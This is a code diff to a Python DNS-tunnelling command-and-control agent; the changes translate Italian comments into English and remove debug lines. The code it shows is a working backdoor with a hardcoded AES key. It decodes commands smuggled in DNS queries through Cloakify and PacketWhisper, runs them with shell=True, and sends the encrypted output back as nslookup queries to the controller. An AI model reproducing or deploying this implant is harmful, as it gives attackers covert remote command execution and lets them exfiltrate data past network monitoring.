@@ -10,7 +10,7 @@ from decloakify import Decloakify
 from pcapCapture import *
 from Receiver.packetWhisper import TransferCloakedFile, ExtractDNSQueriesFromPCAP, ExtractPayloadFromDNSQueries
 
-# Chiave AES (stessa chiave del client)
+# AES Key
 key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
 cipher = "ciphers\\common_fqdn\\topWebsites"
 
@@ -30,23 +30,22 @@ def receive_command():
             print("No command received.")
             return
     
-    # Decloakificare il comando
+    # Decloaky the command
     print("Decloakifying...")
     if Decloakify(cloaked_command, cipher, decloaked_command) == -1:
         print("Requesting re-trasmission")
         send_response('rt', srcIp)
         receive_command()
 
-    # Decrypt command
+    # Decrypt the command
     with open(decloaked_command, 'r') as file:
         encrypted_command = file.read().strip()
-    #print("encrypted_command: ", encrypted_command)
     command = decrypt_message(encrypted_command, key)
     print('received command: '+ command)
     
-    # Eseguire il comando
+    # Execute the command
     try:
-        # Inviare la risposta crittografata
+        # Send response of the execution
         time.sleep(1)
         send_response(subprocess.check_output(command, shell=True).decode('utf-8'), srcIp)
 
@@ -55,29 +54,29 @@ def receive_command():
         time.sleep(1)
         send_response(f"Unrecognized command: {e}")
 
-    # Rimuove il file di comando dopo l'elaborazione
+    # Removes useless files (after execution)
     os.remove(cloaked_command)
     os.remove(decloaked_command)
 
 def send_response(response, dns='localhost'):
     print('Sender IP:', dns)
-    # Cifra la risposta
+    # Encrypt the response
     encrypted_response = encrypt_message(response, key)
 
-    # Cloakificare la risposta
+    # Cloakify the response
     cloaked_response = "cloaked_response.txt"
     
     Cloakify(encrypted_response, cipher, cloaked_response)
     
-    #print("Initializing response transfer")
+    
     TransferCloakedFile("cloaked_response.txt", 0.0)
-    # Inviare la risposta tramite pacchetti DNS
+    # Send response using dns requests
     with open(cloaked_response, 'r') as file:
         for fqdn in file:
             fqdn_str = fqdn.strip()
             subprocess.call(['nslookup', fqdn_str, dns], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
-    # Rimuove il file di risposta dopo l'invio
+    # Remove response file
     os.remove(cloaked_response)
 
 
